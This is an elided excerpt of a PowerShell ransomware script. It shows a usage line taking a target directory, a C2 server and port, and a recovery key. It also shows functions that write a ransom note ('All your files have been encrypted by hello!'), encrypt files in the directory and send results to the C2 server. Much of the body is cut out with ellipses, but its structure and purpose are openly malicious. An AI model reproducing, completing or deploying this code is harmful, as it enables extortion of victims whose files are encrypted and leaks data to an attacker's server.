...
function Show-Help {
   ...
   Write-Host ; Write-Host " Usage: " -ForegroundColor Yellow -NoNewLine ; Write-Host "ps1 -e Directory -s C2Server -p C2Port" -ForegroundColor Blue 
   ...
   Write-Host ; Write-Host "        ps1 -d Directory -k RecoveryKey" -ForegroundColor Blue 
...
function SendResults {
   ...
   $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "[!]" | Select-String "hello!" -NotMatch
...
function CreateReadme {
   $ReadmeTXT = "All your files have been encrypted by hello!`nBut don't worry, you can still recover them with the recovery key :)`n"
...
function EncryptFiles { 
   ...
   $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "[!]" | Select-String "hello!" -NotMatch ; if (!$RansomLogs) { 
...
if ($Mode -eq "-d") { 
   ...
   CreateReadme ; EncryptFiles ; if ($C2Status) {
      SendResults ; sleep 1
